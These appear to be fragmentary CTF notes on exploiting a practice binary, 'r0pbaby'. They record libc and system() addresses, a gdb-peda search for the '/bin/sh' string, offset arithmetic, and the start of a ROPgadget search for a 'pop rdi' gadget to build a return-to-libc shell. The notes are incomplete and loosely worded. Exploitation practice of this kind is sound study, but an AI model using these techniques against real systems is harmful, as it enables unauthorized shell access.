libc.so.6: 0x00007FFFF7FF59B0

Step1:



Step2:
Symbol system: 0x00007FFFF7876460

target:execute system(bin/sh)

find bin/sh
gdb-peda$ find /bin/sh
Found 6 results, display max 6 items:
 [heap] : 0x555555757040 ("/bin/sh\n")
 [heap] : 0x555555757462 --> 0x68732f6e69622f ('/bin/sh')
   libc : 0x7ffff7998879 --> 0x68732f6e69622f ('/bin/sh')
[stack] : 0x7fffffffb787 ("/bin/sh: 0x", '0' <repeats 16 times>, "\n")
[stack] : 0x7fffffffda72 --> 0x68732f6e69622f ('/bin/sh')
[stack] : 0x7fffffffde20 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ x/s 0x7ffff7998879
0x7ffff7998879:	"/bin/sh"

offset_for_bin_sh=0x00007FFFF7FF59B0-0x7ffff7998879

offset_for_system=0x00007FFFF7FF59B0-0x00007FFFF7876460


Step3:
Because x64 is put the position to rdi instead of passing paratmeters,
so rquires gadgets requires pop rdi to pop address to rdi


root@kali:~/Documents/CTF# ROPgadget --binary r0pbaby > log.txt
root@kali:~/Documents/CTF# cat log.txt |grep pop
